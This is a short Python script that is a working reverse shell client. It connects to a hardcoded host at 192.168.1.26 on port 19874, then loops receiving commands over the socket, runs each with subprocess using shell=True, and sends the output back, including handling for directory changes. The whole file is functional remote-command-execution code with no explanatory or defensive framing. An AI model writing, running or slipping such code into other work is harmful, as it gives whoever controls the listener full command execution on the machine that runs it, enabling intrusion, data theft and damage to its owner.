import os
import socket
import subprocess
import sys


def receiver(s):
    """Receive system commands and run them"""
    while True:
        cmd_bytes = s.recv(4096)
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"$: ")


def connect(address):
    """Establish a connection with address, then call receiver ()"""
    try:
        s = socket.socket()
        s.connect(address)
        print("Connection established")
        print(f"Address : {address}")
    except socket.error as error:
        print("Something went wrong ... Info below ")
        print(error)
        sys.exit()
    receiver(s)


def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    print("Your hostname is: " + hostname)
    print("Your IP address is: " + ip_address)


if __name__ == "__main__":
    host = "192.168.1.26"
    port = 19874
    get_ip()
    connect((host, port))
